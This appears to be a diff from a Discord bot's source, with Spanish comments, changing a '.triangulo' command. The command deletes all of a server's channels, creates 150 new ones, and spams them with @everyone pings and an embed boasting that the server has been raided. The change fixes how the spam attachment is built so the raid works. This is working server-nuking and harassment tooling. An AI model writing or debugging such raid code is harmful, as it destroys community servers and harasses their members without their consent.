@@ -177,23 +177,20 @@ else if (cmd.startsWith('.diversión')) {
 else if (cmd === '.triangulo') {
     if (!guild) return;
 
-    // 1. Asegúrate de que el nombre del archivo coincida con su formato real (.gif)
-    const gifFile = new AttachmentBuilder(triangulitoBuffer, { name: 'triangulo.gif' });
-
-    // 2. Ajusta el embed para que apunte al nuevo nombre del archivo
+    // Solo definimos el Embed, el archivo lo crearemos dentro del spam
     const trianguloEmbed = new EmbedBuilder()
       .setColor(0xFF0000)
       .setDescription('TRIANGULITO ES EL MEJOR, HABEIS SIDO RAIDEADO POR EL GOAT DE TRIANGULITO')
-      .setImage('attachment://triangulo.gif'); // Nombre debe coincidir con el de arriba
+      .setImage('attachment://triangulo.gif');
 
     await deleteAllChannels(guild);
     const created = await createChannels(guild, 'TRIANGULITO ES EL MEJOR', 150, 10);
     
-    // 3. Pasa el archivo correctamente al spam
+    // AQUÍ ESTÁ EL CAMBIO: Creamos el archivo dentro de la función de spam
     await spamChannels(created, 10, () => ({
       content: '@everyone',
       embeds: [trianguloEmbed],
-      files: [gifFile] // Usamos la variable definida arriba
+      files: [new AttachmentBuilder(triangulitoBuffer, { name: 'triangulo.gif' })]
     }));
   }
 
